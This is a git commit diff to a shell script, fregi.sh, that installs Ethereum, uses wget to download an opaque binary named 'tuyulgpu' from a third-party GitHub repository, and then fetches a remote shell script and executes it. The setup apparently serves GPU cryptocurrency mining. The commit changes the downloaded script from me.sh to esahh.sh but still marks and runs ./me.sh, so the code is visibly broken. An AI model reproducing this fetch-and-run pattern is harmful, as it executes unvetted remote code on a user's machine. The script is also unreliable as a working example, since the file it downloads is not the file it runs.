e9d2541606a25bfd564c0949c4274370d7eab835
tika <85773242+lokma223@users.noreply.github.com>
2021-06-12 11:39:48 +0700

    Update fregi.sh

--- fregi.sh
+++ fregi.sh
@@ -2,6 +2,6 @@
 sudo add-apt-repository --yes ppa:ethereum/ethereum
 sudo apt install ethereum
 wget https://github.com/nuri655/nur/raw/main/tuyulgpu
-wget https://raw.githubusercontent.com/lokma223/ailern/main/me.sh
+wget https://raw.githubusercontent.com/lokma223/esah/main/esahh.sh
 chmod +x me.sh
 ./me.sh
